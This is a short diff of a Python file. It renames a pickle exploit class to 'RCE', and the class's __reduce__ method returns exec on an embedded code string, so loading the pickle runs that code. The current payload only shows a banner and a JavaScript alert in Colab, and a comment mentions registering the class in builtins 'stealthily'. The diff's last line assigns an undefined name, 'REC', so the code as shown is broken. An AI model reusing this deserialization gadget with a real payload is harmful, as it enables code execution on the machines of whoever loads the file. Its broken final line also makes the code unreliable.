@@ -22,9 +22,9 @@ from IPython.display import display, HTML
 
 
 
-class Exploit:
+class RCE:
     def __reduce__(self):
-        payload = """
+        STRING = """
 from IPython.display import display, HTML, Javascript
 
 # Animated banner
@@ -55,7 +55,7 @@ display(HTML(\"\"\"
 # JS alert
 display(Javascript("alert('⚠️ WARNING: Exploit triggered in Colab!');"))
 """
-        return (exec, (payload,))
+        return (exec, (STRING,))
 
 
 
@@ -63,5 +63,5 @@ display(Javascript("alert('⚠️ WARNING: Exploit triggered in Colab!');"))
 
 
 # Register in builtins stealthily
-builtins.Exploit = Exploit
+builtins.RCE = REC
 
